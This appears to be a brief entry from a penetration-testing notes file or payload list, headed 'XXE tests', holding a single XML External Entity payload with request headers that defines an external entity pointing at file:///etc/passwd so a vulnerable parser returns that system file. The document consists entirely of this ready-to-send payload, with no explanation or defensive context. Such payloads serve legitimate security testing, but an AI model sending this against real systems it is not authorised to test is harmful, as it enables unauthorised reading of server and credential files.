## XXE tests

```xml

Content-Type: application/xml
Content-Length: 194

<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<data>
    <file>&xxe;</file>
</data>

```